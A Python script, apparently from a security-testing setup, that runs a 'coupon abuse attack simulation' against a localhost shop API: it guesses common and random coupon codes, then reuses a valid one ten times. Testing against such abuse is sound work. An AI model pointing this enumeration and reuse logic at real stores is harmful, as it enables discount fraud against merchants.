#!/usr/bin/env python3
"""
Coupon Abuse Attack Simulation
Tests coupon enumeration and abuse
"""

import requests
import time
import random
import string

BASE_URL = "http://localhost:3001"

# Common coupon code patterns
COUPON_PATTERNS = [
    "WELCOME10", "SAVE20", "FREESHIP", "DISCOUNT", "PROMO",
    "SAVE50", "100OFF", "FREE", "ADMIN", "TEST",
    "COUPON", "DEAL", "SPECIAL", "HOLIDAY", "NEWUSER"
]

# Generate random coupon codes
def generate_random_coupon(length=8):
    """Generate random coupon code"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def enumerate_coupons():
    """Try to enumerate valid coupon codes"""
    print("🎫 Starting Coupon Enumeration Attack...")
    print(f"Target: {BASE_URL}/api/coupons/apply\n")
    
    valid_coupons = []
    invalid_count = 0
    
    # Try known patterns
    for coupon in COUPON_PATTERNS:
        try:
            response = requests.get(
                f"{BASE_URL}/api/coupons/apply",
                params={"code": coupon, "amount": 100},
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('valid'):
                    valid_coupons.append(coupon)
                    print(f"✅ Valid coupon found: {coupon}")
                    print(f"   Discount: {data.get('discount')}")
                else:
                    invalid_count += 1
                    print(f"❌ Invalid: {coupon}")
            else:
                invalid_count += 1
                print(f"❌ Invalid: {coupon} (Status: {response.status_code})")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"⚠️  Error testing {coupon}: {e}")
            invalid_count += 1
    
    # Try random codes
    print("\n🎲 Testing random coupon codes...")
    for _ in range(20):
        random_coupon = generate_random_coupon()
        try:
            response = requests.get(
                f"{BASE_URL}/api/coupons/apply",
                params={"code": random_coupon, "amount": 100},
                timeout=5
            )
            
            if response.status_code == 200 and response.json().get('valid'):
                valid_coupons.append(random_coupon)
                print(f"✅ Random valid coupon: {random_coupon}")
            
            time.sleep(0.2)
            
        except Exception as e:
            pass
    
    print(f"\n📊 Coupon Enumeration Summary:")
    print(f"   Valid coupons found: {len(valid_coupons)}")
    print(f"   Invalid attempts: {invalid_count}")
    if valid_coupons:
        print(f"   Valid codes: {', '.join(valid_coupons)}")

def abuse_valid_coupon():
    """Abuse a valid coupon multiple times"""
    print("\n💸 Testing Coupon Abuse (Multiple Uses)...")
    
    # First, find a valid coupon
    valid_coupon = None
    for coupon in ["WELCOME10", "SAVE20", "FREESHIP"]:
        try:
            response = requests.get(
                f"{BASE_URL}/api/coupons/apply",
                params={"code": coupon, "amount": 100},
                timeout=5
            )
            if response.status_code == 200 and response.json().get('valid'):
                valid_coupon = coupon
                break
        except:
            pass
    
    if not valid_coupon:
        print("No valid coupon found for abuse test")
        return
    
    print(f"Abusing coupon: {valid_coupon}")
    
    # Try to use it multiple times
    for i in range(10):
        try:
            response = requests.get(
                f"{BASE_URL}/api/coupons/apply",
                params={"code": valid_coupon, "amount": 100},
                timeout=5
            )
            print(f"Use {i+1}: Status {response.status_code}, Valid: {response.json().get('valid', False)}")
            time.sleep(0.2)
        except Exception as e:
            print(f"Error on use {i+1}: {e}")

if __name__ == "__main__":
    enumerate_coupons()
    abuse_valid_coupon()
